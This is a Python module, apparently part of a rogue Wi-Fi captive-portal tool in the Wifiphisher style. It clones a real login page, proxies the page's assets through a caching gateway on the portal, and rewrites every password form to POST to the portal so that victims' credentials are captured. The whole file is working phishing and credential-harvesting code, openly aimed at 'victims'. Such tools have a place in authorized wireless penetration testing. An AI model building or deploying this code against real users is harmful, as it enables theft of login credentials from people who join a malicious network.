"""Live portal-page cloning (Wifiphisher-style) + per-victim token field.

Fetches the real login page over the box's uplink, rewrites it so every
absolute http(s)/protocol-relative resource (css/js/img/iframe/`url(...)`) is
served through the rogue portal's own asset gateway, and forces any form
containing a password field to POST to the portal root where the engine
captures credentials. The rewritten page is stored as a custom template the
operator activates from the template dropdown.

The gateway is a lazily-filling on-disk cache: the victim's browser asks the
portal for `/__clone/<netloc>/<path>[?query]`, and the portal fetches that
asset once from the real site and serves it locally thereafter. This keeps the
clone visually identical without baking anything into the template on-disk at
clone time.
"""

import hashlib
import mimetypes
import os
import re
import urllib.error
import urllib.parse
import urllib.request

from . import config

FETCH_TIMEOUT = 10
FETCH_CAP = 2 * 1024 * 1024        # cloned page budget
ASSET_CAP = 3 * 1024 * 1024        # single proxied asset budget
GATEWAY = '__clone'                # portal path prefix for proxied assets

_ATTR_RE = re.compile(r'(?i)\b(src|href|action|data-src)\s*=\s*(["\'])(.*?)\2')
_CSS_URL_RE = re.compile(r'url\(\s*(["\']?)([^)]*?)\1\s*\)')
_FORM_RE = re.compile(r'(?is)<form\b[^>]*>.*?</form>')
_FORM_OPEN_RE = re.compile(r'(?i)<form\b[^>]*>')

_UA = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
       '(KHTML, like Gecko) Chrome/124.0 Safari/537.36')
_HEADERS = {'User-Agent': _UA, 'Accept-Encoding': 'identity'}


def _asset_dir():
    return os.path.join(config.STATE_DIR, 'asset-cache')


def http_url(url):
    """Normalize to an absolute http(s) URL, or None when not proxiable."""
    u = (url or '').strip()
    if u.startswith('//'):
        u = 'https:' + u
    low = u.lower()
    if not (low.startswith('http://') or low.startswith('https://')):
        return None
    return u


def gateway_uri(url):
    """Portal-relative URI a victim browser should request for this asset.

    Takes an already-absolute http(s) URL (or protocol-relative) and maps it to
    `/__clone/<netloc>/<path>[?query]`. Returns None when the reference can't be
    proxied (non-http(s): data:/mailto:/#/javascript: stay as-is) or when it
    already targets the rogue portal itself.
    """
    u = http_url(url)
    if not u:
        return None
    try:
        parsed = urllib.parse.urlsplit(u)
        netloc = (parsed.netloc or '').split(':')[0]
        myhost = (config.PORTAL_IP or '').split(':')[0]
        if not netloc or not parsed.path or netloc == myhost or \
                netloc == 'localhost' or netloc == 'portal':
            return None
        opaque = urllib.parse.quote('%s%s' % (netloc, parsed.path), safe='/')
        if parsed.query:
            opaque += '?' + parsed.query
        return '/%s/%s' % (GATEWAY, opaque)
    except ValueError:
        return None


def _resolve_refs(html, base):
    """Resolve every href/src/action/data-src and css url(...) against `base`
    so gateway_uri sees only absolute URLs. Leaves fragments, data:, mailto:
    and other non-proxiable references untouched.

    Returns the absolute URL a reference becomes, or None to keep it as-is.
    """
    u = http_url(base)

    def resolve(val):
        val = (val or '').strip()
        low = val.lower()
        if val.startswith('/%s/' % GATEWAY):
            return None                    # already a gateway path
        if low.startswith(('data:', 'mailto:', 'tel:', 'javascript:', 'about:',
                           'blob:', 'ftp:', '#')):
            return None
        if u is None:
            return None if not val.startswith(('http://', 'https://', '//')) \
                else val
        return urllib.parse.urljoin(u, val)

    def attr_repl(m):
        name, quote, val = m.group(1), m.group(2), m.group(3)
        abs_url = resolve(val)
        if not abs_url:
            return m.group(0)
        g = gateway_uri(abs_url)
        if not g:
            return m.group(0)
        return '%s=%s%s%s' % (name, quote, g, quote)

    def css_repl(m):
        wrap, val = m.group(1), m.group(2)
        abs_url = resolve(val)
        if not abs_url:
            return m.group(0)
        g = gateway_uri(abs_url)
        if not g:
            return m.group(0)
        return 'url(%s%s%s)' % (wrap, g, wrap)

    html = _ATTR_RE.sub(attr_repl, html)
    return _CSS_URL_RE.sub(css_repl, html)


def _append_attr_before_gt(tag, attr):
    if not tag.endswith('>'):
        return tag + ' ' + attr
    return tag[:-1] + ' ' + attr + '>'


def _normalize_password_form(open_tag):
    """Point a login form at the portal root and force method=post."""
    tag = open_tag
    tag = re.sub(r'(?i)\s+action\s*=\s*["\'][^"\']*["\']',
                 ' action="/"', tag, count=1)
    if not re.search(r'(?i)\saction\s*=', tag):
        tag = _append_attr_before_gt(tag, 'action="/"')
    tag = re.sub(r'(?i)\s+method\s*=\s*["\'][^"\']*["\']',
                 ' method="post"', tag, count=1)
    if not re.search(r'(?i)\smethod\s*=', tag):
        tag = _append_attr_before_gt(tag, 'method="post"')
    return tag


def _rewrite_forms(html, base):
    """Password forms must land on the portal POST sink (any path works there,
    but the canonical '/' is cleanest) so credentials are captured regardless
    of the original form's action/method/js."""

    def repl(m):
        frag = m.group(0)
        if not re.search(r'(?i)\btype\s*=\s*["\']?password', frag):
            return frag
        om = _FORM_OPEN_RE.search(frag)
        if not om:
            return frag
        open_tag = _normalize_password_form(om.group(0))
        return open_tag + frag[om.end():]

    return _FORM_RE.sub(repl, html)


def rewrite(html, base=None):
    """Full rewrite: assets -> gateway, password forms -> portal POST sink.

    `base` is the real page URL the clone was fetched from; every asset
    reference in the markup is resolved against it and re-pointed at the
    rogue portal's asset gateway.
    """
    html = _resolve_refs(html, base)
    return _rewrite_forms(html, base)


def _read_cap(resp, cap):
    data = resp.read(cap + 1)
    if len(data) > cap:
        raise IOError('resource exceeds %d bytes' % cap)
    return data


def _fetch(url, cap):
    """Fetch one URL (https first, http fallback). Returns bytes or None."""
    for candidate in (url, url.replace('https://', 'http://', 1)):
        try:
            req = urllib.request.Request(candidate, headers=_HEADERS)
            with urllib.request.urlopen(req, timeout=FETCH_TIMEOUT) as resp:
                return _read_cap(resp, cap)
        except (OSError, IOError, ValueError, urllib.error.URLError):
            continue
    return None


def _cache_path(url):
    return os.path.join(_asset_dir(),
                        hashlib.sha1(url.encode('utf-8', 'replace')).
                        hexdigest())


def fetch_cached(url, cap):
    """Fetch-through cache: try the on-disk asset cache, else fetch and store."""
    path = _cache_path(url)
    try:
        with open(path, 'rb') as fh:
            return fh.read()
    except (IOError, OSError):
        pass
    data = _fetch(url, cap)
    if data is None:
        return None
    try:
        os.makedirs(_asset_dir(), exist_ok=True)
        with open(path, 'wb') as fh:
            fh.write(data)
    except OSError:
        pass
    return data


def fetch_gateway_asset(proxy_uri, portal=None):
    """Resolve one proxied asset request into (bytes, content-type).

    `proxy_uri` is the portal path INCLUDING `/__clone/` and any query.
    Returns (None, '') when the reference is malformed or unfetchable.
    """
    portal = portal or config.PORTAL_IP
    if not (proxy_uri or '').startswith('/%s/' % GATEWAY):
        return None, ''
    raw = proxy_uri[len('/%s/' % GATEWAY):]
    if raw.endswith('/'):
        raw = raw[:-1]
    target = urllib.parse.unquote(raw)
    url = 'https://' + target
    data = fetch_cached(url, ASSET_CAP)
    if data is None:
        return None, ''
    ctype = mimetypes.guess_type(url)[0] or 'application/octet-stream'
    return data, ctype


def clone_page(url, portal=None):
    """Fetch a real login page and return its portal-ready rewrite.

    Raises IOError on fetch failure so callers can surface a reason instead of
    silently falling back to the generic template.
    """
    portal = portal or config.PORTAL_IP
    u = http_url(url)
    if not u:
        raise IOError('url must start with http:// or https://')
    data = _fetch(u, FETCH_CAP)
    if data is None:
        raise IOError('fetch failed for %s' % u)
    return rewrite(data.decode('utf-8', 'replace'), u)